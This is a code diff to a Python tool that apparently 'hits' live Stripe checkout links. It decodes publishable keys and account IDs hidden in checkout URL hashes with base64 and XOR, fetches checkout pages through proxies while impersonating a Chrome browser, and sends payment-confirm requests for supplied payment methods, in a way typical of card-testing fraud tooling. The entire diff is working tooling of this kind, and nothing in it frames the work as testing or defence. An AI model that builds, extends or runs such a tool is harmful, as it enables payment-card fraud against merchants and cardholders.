@@ -69,25 +69,17 @@ class StripeAPIExtractor:
         res = {'pk_key': None, 'stripe_account': None}
         if not url_str or '#' not in url_str:
             return res
-        hash_str = url_str.split('#')[1]
-        decoded = urllib.parse.unquote(hash_str)
-        
-        candidates = [decoded]
-        if decoded.startswith('fidn'):
-            candidates.append(decoded[4:])
-        
-        for cand in candidates:
-            for pad in ('', '=', '==', '==='):
-                try:
-                    raw_bytes = base64.b64decode(cand + pad)
-                    json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
-                    if '"apiKey"' in json_str or '"stripeAccount"' in json_str:
-                        data = json.loads(json_str)
-                        res['pk_key'] = data.get('apiKey')
-                        res['stripe_account'] = data.get('stripeAccount')
-                        return res
-                except Exception:
-                    pass
+        try:
+            import urllib.parse, base64, json
+            hash_str = url_str.split('#')[1]
+            decoded = urllib.parse.unquote(hash_str)
+            raw_bytes = base64.b64decode(decoded + '==')
+            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
+            data = json.loads(json_str)
+            res['pk_key'] = data.get('apiKey')
+            res['stripe_account'] = data.get('stripeAccount')
+        except Exception:
+            pass
         return res
     
     @staticmethod
@@ -1048,6 +1040,7 @@ class StripeAPIHitter:
                 }
                 if self.stripe_account:
                     headers["Stripe-Account"] = self.stripe_account
+                print(f"DEBUG hit headers Stripe-Account: {headers.get('Stripe-Account')}", flush=True)
                 if "sec-ch-ua" in profile: headers["sec-ch-ua"] = profile["sec-ch-ua"]
                 if "sec-ch-ua-mobile" in profile: headers["sec-ch-ua-mobile"] = profile["sec-ch-ua-mobile"]
                 if "sec-ch-ua-platform" in profile: headers["sec-ch-ua-platform"] = profile["sec-ch-ua-platform"]
@@ -1261,7 +1254,6 @@ class StripeAPIHitter:
                     confirm_data = {
                         "payment_method": pm_id,
                         "expected_payment_method_type": "card",
-                        "use_stripe_sdk": "false",
                         "consent[terms_of_service]": "accepted",
                         "key": self.pk_live,
                     }
@@ -1759,13 +1751,11 @@ class ConcurrentHitter:
                 self.url_info['raw_amount'] = api_data.get('raw_amount')
                 self.url_info['merchant'] = api_data.get('merchant')
                 self.url_info['locked_email'] = api_data.get('locked_email')
-                return True
-            else:
-                err_msg = api_data.get('error') or "Failed to init Stripe session"
                 if self.update_callback:
-                    await self.update_callback({"status": "error", "error": f"Stripe session inactive: {err_msg}"})
-                return False
+                    await self.update_callback({"status": "starting", "url_info": self.url_info})
+                return True
 
+        # Fallback Path: Fetch page HTML if URL hash did not contain keys
         for attempt in range(1, 4):
             try:
                 if self.update_callback:
@@ -1778,38 +1768,37 @@ class ConcurrentHitter:
                     proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                     proxies = {"http": proxy_url, "https": proxy_url}
                 
-                async with ChromeSession(impersonate="chrome120", proxies=proxies) as s:
-                    resp = await s.get(self.url, timeout=5)
-                    html = resp.text
+                loop = asyncio.get_event_loop()
+                resp = await loop.run_in_executor(None, lambda: cffi_requests.get(self.url, proxies=proxies, timeout=5, impersonate="chrome120"))
+                html = resp.text
                     
-                    cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
-                    
-                    hash_details = StripeAPIExtractor.extract_details_from_url_hash(self.url)
-                    pk_key = hash_details.get('pk_key')
-                    stripe_account = hash_details.get('stripe_account')
-                    
-                    if not pk_key:
-                        pk_key = StripeAPIExtractor.extract_pk_live(html)
-                        
-                    self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
-                    
-                    if cs_token and pk_key:
-                        api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
-                        if api_data.get('success'):
-                            self.url_info['amount'] = api_data.get('amount')
-                            self.url_info['raw_amount'] = api_data.get('raw_amount')
-                            self.url_info['merchant'] = api_data.get('merchant')
-                            self.url_info['locked_email'] = api_data.get('locked_email')
-                            return True
-                        else:
-                            err_msg = api_data.get('error') or "Failed to init Stripe session"
-                            if self.update_callback:
-                                await self.update_callback({"status": "error", "error": f"Stripe session inactive: {err_msg}"})
-                            return False
-                    else:
+                cs_token = StripeAPIExtractor.extract_cs_live(self.url, html)
+                
+                hash_details = StripeAPIExtractor.extract_details_from_url_hash(self.url)
+                pk_key = hash_details.get('pk_key') or StripeAPIExtractor.extract_pk_live(html)
+                stripe_account = hash_details.get('stripe_account')
+                
+                self.url_info = {'cs_token': cs_token, 'pk_key': pk_key, 'stripe_account': stripe_account, 'merchant': 'Unknown', 'amount': None, 'raw_amount': None}
+                
+                if cs_token and pk_key:
+                    api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key, stripe_account=stripe_account)
+                    if api_data.get('success'):
+                        self.url_info['amount'] = api_data.get('amount')
+                        self.url_info['raw_amount'] = api_data.get('raw_amount')
+                        self.url_info['merchant'] = api_data.get('merchant')
+                        self.url_info['locked_email'] = api_data.get('locked_email')
                         if self.update_callback:
-                            await self.update_callback({"status": "error", "error": "Could not extract publishable key or client secret from link."})
+                            await self.update_callback({"status": "starting", "url_info": self.url_info})
+                        return True
+                    else:
+                        err_msg = api_data.get('error') or "Failed to init Stripe session"
+                        if self.update_callback:
+                            await self.update_callback({"status": "error", "error": f"Stripe session inactive: {err_msg}"})
                         return False
+                else:
+                    if self.update_callback:
+                        await self.update_callback({"status": "error", "error": "Could not extract publishable key or client secret from link."})
+                    return False
             except Exception as e:
                 print(f"DEBUG: analyze_first attempt {attempt} failed: {e}", flush=True)
                 continue
